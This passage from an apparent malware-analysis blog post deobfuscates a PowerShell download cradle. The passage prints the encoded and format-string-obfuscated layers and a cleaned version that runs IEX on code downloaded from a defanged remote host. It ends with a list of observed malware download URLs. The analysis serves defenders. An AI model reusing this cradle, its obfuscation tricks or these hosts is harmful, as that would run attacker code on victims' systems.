						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9ad048240797-1"><span class="crayon-o">-</span><span class="crayon-e">JOIn</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">32</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">36</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">86</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">115</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">110</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">50</span><span class="crayon-sy">,</span><span class="crayon-cn">108</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">54</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">61</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-sy">,</span><span class="crayon-cn">32</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">91</span><span class="crayon-sy">,</span><span class="crayon-cn">116</span><span class="crayon-sy">,</span><span class="crayon-cn">121</span><span class="crayon-sy">,</span><span class="crayon-cn">112</span><span class="crayon-sy">,</span><span class="crayon-cn">101</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">93</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">40</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">34</span><span class="crayon-sy">,</span><span class="crayon-cn">123</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">51</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">125</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">123</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">48</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">125</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">123</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">49</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">125</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">53</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">45</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">49</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">54</span><span class="crayon-sy">,</span><span class="crayon-cn">55</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">45</span><span class="crayon-sy">,</span><span class="crayon-cn">39</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">39</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">101</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">46</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">97</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">109</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">97</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">122</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">111</span><span class="crayon-sy">,</span><span class="crayon-cn">110</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">97</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">39</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">39</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">53</span><span class="crayon-sy">,</span><span class="crayon-cn">39</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-sy">,</span><span class="crayon-cn">39</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">119</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">115</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">46</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">99</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">111</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">109</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">58</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">56</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">48</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">39</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">44</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">39</span><span class="crayon-sy">,</span><span class="crayon-cn">45</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">119</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">101</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-cn">115</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">39</span><span class="crayon-sy">,</span><span class="crayon-cn">41</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">41</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">59</span><span class="crayon-sy">)</span><span class="crayon-o">|</span><span class="crayon-o">%</span><span class="crayon-sy">{</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-t">inT</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-o">-</span><span class="crayon-st">AS</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-t">chAr</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">iex</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0012 seconds] -->
<p>Layer 3 –</p>
<p>The decoded data uses various techniques to obfuscate itself. The first technique is injecting backtick characters between other characters, which will be ignored at runtime. This is similar to the caret injection technique from the command-line, but works within the PowerShell code instead.</p>
<p>It also uses a technique commonly seen in other scripting languages by breaking up a string into a randomized list and then rebuilding the original string by calling specific values.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9ae210182844" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$Vsn2l6 =  [type]("{3}{0}{1}{2}" -F\'UE\',\'S\',\'t\',\'Net.webreq\') ;  $h69Q4  =[TYPe]("{1}{2}{3}{4}{0}"-F \'he\',\'nEt.C\',\'REDeNtialC\',\'a\',\'c\') ;  ${J}=&amp;amp;("{0}{1}{2}"-f \'new-obj\',\'ec\',\'t\') ("{2}{1}{0}{3}" -f \'eb\',\'.w\',\'net\',\'client\');${j}."PRo`XY"=  ( VaRIablE  vsn2L6 ).VaLuE::("{0}{3}{2}{4}{1}"-f\'GetS\',\'Proxy\',\'em\',\'yst\',\'Web\').Invoke();${j}."pr`OXY"."C`RE`De`NTiALs"= (  GeT-VariaBle  H69Q4).VaLUe::"DE`Faultcred`en`TI`ALS";.("{0}{1}"-f \'I\',\'EX\') ${J}.("{1}{3}{2}{0}" -f \'string\',\'do\',\'load\',\'wn\').Invoke(("{3}{1}{9}{11}{8}{13}{0}{4}{15}{5}{10}{2}{12}{14}{7}{6}" -f\'5\',\'tp://\',\'mput\',\'ht\',\'.us\',\'t\',\'0/anSfrf\',\'8\',\'185-\',\'e\',\'-2.co\',\'c2-35-167-\',\'e.amazona\',\'5\',\'ws[.]com:80\',\'-wes\'));</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9ae210182844-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9ae210182844-1"><span class="crayon-sy">$</span><span class="crayon-v">Vsn2l6</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-v">type</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-s">"{3}{0}{1}{2}"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">F</span><span class="crayon-sy">\</span>'<span class="crayon-v">UE</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">S</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">t</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">webreq</span><span class="crayon-sy">\</span>'<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">h69Q4</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">TYPe</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-s">"{1}{2}{3}{4}{0}"</span><span class="crayon-o">-</span><span class="crayon-i">F</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>'<span class="crayon-v">he</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">nEt</span><span class="crayon-sy">.</span><span class="crayon-v">C</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">REDeNtialC</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">a</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">c</span><span class="crayon-sy">\</span>'<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-sy">{</span><span class="crayon-v">J</span><span class="crayon-sy">}</span><span class="crayon-o">=&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-sy">(</span><span class="crayon-s">"{0}{1}{2}"</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>'<span class="crayon-r">new</span><span class="crayon-o">-</span><span class="crayon-v">obj</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">ec</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">t</span><span class="crayon-sy">\</span>'<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"{2}{1}{0}{3}"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>'<span class="crayon-v">eb</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-sy">.</span><span class="crayon-v">w</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">net</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">client</span><span class="crayon-sy">\</span>'<span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-sy">{</span><span class="crayon-v">j</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-s">"PRo`XY"</span><span class="crayon-o">=</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">VaRIablE&nbsp;&nbsp;</span><span class="crayon-i">vsn2L6</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">VaLuE</span><span class="crayon-o">::</span><span class="crayon-sy">(</span><span class="crayon-s">"{0}{3}{2}{4}{1}"</span><span class="crayon-o">-</span><span class="crayon-v">f</span><span class="crayon-sy">\</span>'<span class="crayon-v">GetS</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">Proxy</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">em</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">yst</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">Web</span><span class="crayon-sy">\</span>'<span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">Invoke</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-sy">{</span><span class="crayon-v">j</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-s">"pr`OXY"</span><span class="crayon-sy">.</span><span class="crayon-s">"C`RE`De`NTiALs"</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">GeT</span><span class="crayon-o">-</span><span class="crayon-e">VariaBle&nbsp;&nbsp;</span><span class="crayon-v">H69Q4</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">VaLUe</span><span class="crayon-o">::</span><span class="crayon-s">"DE`Faultcred`en`TI`ALS"</span><span class="crayon-sy">;</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">"{0}{1}"</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>'<span class="crayon-v">I</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">EX</span><span class="crayon-sy">\</span>'<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-sy">{</span><span class="crayon-v">J</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-s">"{1}{3}{2}{0}"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>'<span class="crayon-t">string</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-st">do</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">load</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">wn</span><span class="crayon-sy">\</span>'<span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">Invoke</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">"{3}{1}{9}{11}{8}{13}{0}{4}{15}{5}{10}{2}{12}{14}{7}{6}"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">f</span><span class="crayon-sy">\</span>'<span class="crayon-cn">5</span><span class="crayon-sy">\</span>'<span class="crayon-sy">,</span><span class="crayon-sy">\</span>'<span class="crayon-v">tp</span><span class="crayon-o">:</span><span class="crayon-c">//\',\'mput\',\'ht\',\'.us\',\'t\',\'0/anSfrf\',\'8\',\'185-\',\'e\',\'-2.co\',\'c2-35-167-\',\'e.amazona\',\'5\',\'ws[.]com:80\',\'-wes\'));</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0014 seconds] -->
<p>Cleaning up the code and building the strings shows that it downloads code remotely to pass to Invoke-Expression.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9b0101183016" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$Vsn2l6 = [type]Net.webreqUESt;
$h69Q4 = [TYPe]nEt.CREDeNtialCache;
&amp;amp;new-object net.webclient;
PRoXY	= $Vsn2l6.VaLuE::GetSystemWebProxy.Invoke();
prOXY.CREDeNTiALs = ( GeT-VariaBle $h69Q4 ).VaLUe::DEFaultcredenTIALS;
.IEX downloadstring.Invoke(http://ec2-35-167-185-55.us-west-2.compute.amazonaws[.]com:8080/anSfrf);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9b0101183016-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b0101183016-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b0101183016-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b0101183016-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c9b0101183016-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9b0101183016-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9b0101183016-1"><span class="crayon-sy">$</span><span class="crayon-v">Vsn2l6</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">type</span><span class="crayon-sy">]</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">webreqUESt</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b0101183016-2"><span class="crayon-sy">$</span><span class="crayon-v">h69Q4</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">TYPe</span><span class="crayon-sy">]</span><span class="crayon-v">nEt</span><span class="crayon-sy">.</span><span class="crayon-v">CREDeNtialCache</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b0101183016-3"><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-r">new</span><span class="crayon-o">-</span><span class="crayon-t">object</span><span class="crayon-h"> </span><span class="crayon-v">net</span><span class="crayon-sy">.</span><span class="crayon-v">webclient</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b0101183016-4"><span class="crayon-v">PRoXY</span><span class="crayon-h">	</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">Vsn2l6</span><span class="crayon-sy">.</span><span class="crayon-v">VaLuE</span><span class="crayon-o">::</span><span class="crayon-v">GetSystemWebProxy</span><span class="crayon-sy">.</span><span class="crayon-e">Invoke</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b0101183016-5"><span class="crayon-v">prOXY</span><span class="crayon-sy">.</span><span class="crayon-v">CREDeNTiALs</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">GeT</span><span class="crayon-o">-</span><span class="crayon-i">VariaBle</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">h69Q4</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">VaLUe</span><span class="crayon-o">::</span><span class="crayon-v">DEFaultcredenTIALS</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b0101183016-6"><span class="crayon-sy">.</span><span class="crayon-e">IEX </span><span class="crayon-v">downloadstring</span><span class="crayon-sy">.</span><span class="crayon-e">Invoke</span><span class="crayon-sy">(</span><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//ec2-35-167-185-55.us-west-2.compute.amazonaws[.]com:8080/anSfrf);</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p></p>
<h3>Conclusion</h3>
<p>PowerShell is a robust scripting framework that offers a lot of capabilities, both for defense and offense. Hopefully this blog has served to highlight some of the current techniques being used in tools and attacks.</p>
<p>Across these samples, it seems clear that the majority of attacks are still relying on public tools, which isn’t surprising. As the PowerShell framework continues to be explored and matured, I suspect we will begin to see a lot more variation in attacks coming from this space. As it stands today, PowerShell seems to be mainly used as a tool to facilitate common functions attackers are used to within other frameworks, but will eventually start to take advantage of more native features once we move out of the “transference” phase to an “innovative” phase.</p>
<h3>Observed C2 or Download Sites</h3>
<p><strong>Downloader DFSP</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9b1144488533" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
675	hxxp://94[.]102.53.238/~yahoo/csrsv.exe
244	hxxp://89[.]248.170.218/~yahoo/csrsv.exe
132	hxxp://94[.]102.58.30/~trevor/winx64.exe
70	hxxp://80[.]82.64.45/~yakar/msvmonr.exe
24	hxxp://89[.]248.166.140/~zebra/iesecv.exe
18	hxxp://cajos[.]in/0x/1.exe
14	hxxp://93[.]174.94.137/~karma/scvhost.exe
6	hxxp://ddl7[.]data.hu/get/0/9507148/Patload.exe
5	hxxp://nikil[.]tk/p1/Pa_001.exe
5	hxxp://185[.]45.193.17/update.exe
5	hxxp://185[.]141.27.28/update.exe
4	hxxps://a[.]pomf.cat/xsakpo.exe
4	hxxp://185[.]141.27.35/update.exe
3	hxxp://www[.]macwizinfo.com/updates/anna.exe
3	hxxp://worldnit[.]com/opera.exe
3	hxxp://doc[.]cherrycoffeeequipment.com/nw/logo.png
3	hxxp://185[.]141.25.142/update.exe
3	hxxp://185[.]117.75.43/update.exe
3	hxxp://185[.]106.122.64/update.exe
2	hxxp://185[.]141.25.243/file.exe
2	hxxp://185[.]141.27.32/update.exe
2	hxxp://185[.]141.27.34/update.exe
2	hxxp://andersonken4791[.]pserver.ru/doc.exe
2	hxxp://boisedelariviere[.]com/backup/css/newconfig.exe
2	hxxp://brokelimiteds[.]in/wp-admin/css/upload/Order.exe
2	hxxp://ddl7[.]data.hu/get/0/9499830/money.exe
2	hxxp://fetzhost[.]net/files/044ae4aa5e0f2e8df02bd41bdc2670b0.exe
2	hxxp://hnng[.]moe/f/InX
2	hxxp://hnng[.]moe/f/Iot
2	hxxp://labid[.]com.my/m/m1.exe
2	hxxp://labid[.]com.my/power/powex.exe
2	hxxp://labid[.]com.my/spe/spendy.exe
2	hxxp://lvrxd[.]3eeweb.com/nano/Calculator.exe
2	hxxp://matkalv[.]5gbfree.com/loso/fasoo.exe
2	hxxp://net[.]gethost.pw/windro.exe
2	hxxp://nikil[.]tk/i1/iz_001.exe
2	hxxp://rgho[.]st/68lJcGFLW
2	hxxp://rgho[.]st/6hrkjYlX4
2	hxxp://toxicsolutions[.]ru/upload/praisefud.exe
2	hxxp://worldnit[.]com/KUKU.exe
2	hxxp://worldnit[.]com/kundelo.exe
2	hxxp://worldnit[.]com/operamini.exe
2	hxxp://www[.]wealthandhealthops.com/modules/mod_easyblogquickpost/lawdsijdoef.exe
2	hxxps://a[.]pomf.cat/drktzz.exe
2	hxxps://a[.]pomf.cat/dwnysn.exe
2	hxxps://a[.]pomf.cat/dwnysn.exe
2	hxxps://a[.]pomf.cat/hsmqrh.exe
2	hxxps://a[.]pomf.cat/mjnspx.exe
2	hxxps://a[.]pomf.cat/pabfzv.exe
2	hxxps://a[.]pomf.cat/qolcls.exe
2	hxxps://a[.]pomf.cat/tpaesb.exe
2	hxxps://a[.]pomf.cat/ultxkr.exe
2	hxxps://a[.]pomf.cat/vhcwbo.exe
2	hxxps://a[.]pomf.cat/vjadwb.exe
2	hxxps://a[.]pomf.cat/wopkwj.exe
2	hxxps://a[.]pomf.cat/yspcsr.exe
